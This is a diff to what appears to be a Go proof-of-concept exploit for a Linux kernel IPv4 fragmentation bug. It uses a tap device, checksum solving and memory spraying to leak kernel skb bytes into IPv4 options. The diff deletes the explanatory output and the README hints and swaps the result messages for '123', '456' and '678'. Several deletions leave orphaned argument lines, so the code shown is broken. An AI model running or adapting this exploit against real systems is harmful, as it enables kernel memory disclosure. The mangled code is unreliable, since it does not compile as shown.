@@ -38,14 +38,10 @@ const (
 
 func main() {
 	if os.Geteuid() != 0 {
-		fmt.Fprintln(os.Stderr, "must run as root inside the lab netns")
-		fmt.Fprintln(os.Stderr, "see README.md")
 		os.Exit(1)
 	}
 	cfg := parseCfg()
 	if err := run(cfg); err != nil {
-		fmt.Fprintf(os.Stderr, "%v\n", err)
-		fmt.Fprintln(os.Stderr, "lab not ready; see README.md")
 		os.Exit(1)
 	}
 }
@@ -122,7 +118,6 @@ func verifyWrite(tap *os.File, cap *capture) error {
 	if len(got) == 0 {
 		return errors.New("verify: no fragment captured")
 	}
-	fmt.Printf("verify: first byte 0x%02x ihl=%d hdr=%s\n",
 		got[0][0], got[0][0]&0x0f, hex.EncodeToString(got[0][:min(20, len(got[0]))]))
 	if got[0][0] != 0x4f {
 		return fmt.Errorf("verify: wanted 0x4f, got 0x%02x", got[0][0])
@@ -162,18 +157,15 @@ func leak(tap *os.File, cap *capture, c cfg) error {
 	if len(pkts) == 0 {
 		return errors.New("leak: no fragment captured")
 	}
-	fmt.Printf("leak: %d output fragment(s)\n", len(pkts))
 	var leaked, mutated bool
 	for i, ip := range pkts {
 		ihl := int(ip[0]&0x0f) * 4
-		fmt.Printf("  frag %d first=0x%02x ihl_bytes=%d tot=%d\n",
 			i, ip[0], ihl, binary.BigEndian.Uint16(ip[2:]))
 		if ip[0] != 0x4f {
 			continue
 		}
 		mutated = true
 		extra := ip[ipLen:ihl]
-		fmt.Printf("    options %d bytes: %s\n", len(extra), hex.EncodeToString(extra))
 		host := extra[c.head:]
 		nonzero := 0
 		for _, b := range host {
@@ -181,19 +173,17 @@ func leak(tap *os.File, cap *capture, c cfg) error {
 				nonzero++
 			}
 		}
-		fmt.Printf("    past guest linear payload: %d byte(s), %d nonzero\n", len(host), nonzero)
 		if len(host) > 0 {
 			leaked = true
 		}
 	}
 	switch {
 	case leaked:
-		fmt.Printf("result: fragmenter copied %d bytes past the %d-byte linear head into IPv4 options\n", 60-(ipLen+c.head), ipLen+c.head)
-		fmt.Println("note: -head selects that skb; -page uses a page_frag head whose tail can hold skb metadata")
+		fmt.Println("123")
 	case mutated:
-		fmt.Println("result: IHL mutated to 15; all 60 copied bytes were within the linear head")
+		fmt.Println("456")
 	default:
-		fmt.Println("result: reassembly path did not preserve the partial checksum")
+		fmt.Println("678")
 	}
 	return nil
 }
@@ -210,7 +200,6 @@ func solve(payload []byte, id uint16) bool {
 		pkt := datagram(id, payload)
 		forwardTTL(pkt)
 		if csumFold(csumPartial(pkt)) == 0x004f {
-			fmt.Printf("adjustment %#04x at IP offset %d\n", w, adj)
 			return true
 		}
 	}
@@ -378,9 +367,6 @@ func printHead(c cfg) {
 	if c.page {
 		via = "page_frag skb (tun_build_skb)"
 	}
-	fmt.Printf("head: payload=%d frame=%d linear_after_strip=%d copy=60 past_headlen=%d via=%s spray=%d fill=0x%02x\n",
-		c.head, frameLen, ipLen+c.head, past, via, c.spray, c.sprayFill)
-	fmt.Println("head: the offset-0 fragment is the skb whose bytes after skb_headlen are copied")
 }
 
 func ipChecksum(h []byte) uint16 {
